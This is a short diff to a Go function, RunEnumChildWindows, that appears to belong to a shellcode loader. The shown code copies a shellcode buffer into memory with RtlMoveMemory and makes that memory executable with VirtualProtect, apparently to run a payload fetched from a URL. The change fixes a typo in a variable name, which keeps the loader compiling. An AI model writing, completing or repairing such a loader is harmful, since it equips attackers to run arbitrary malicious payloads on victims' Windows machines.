@@ -35,7 +35,7 @@ func RunEnumChildWindows(url string) {
 	}
 	_, _, errRtlMoveMemory :=  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling RtlMoveMemory:\r\n%s", errRtlMoveMemoryy.Error()))
+		log.Fatal(fmt.Sprintf("[!]Error calling RtlMoveMemory:\r\n%s", errRtlMoveMemory.Error()))
 	}
 	oldProtect := PAGE_READWRITE
 	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
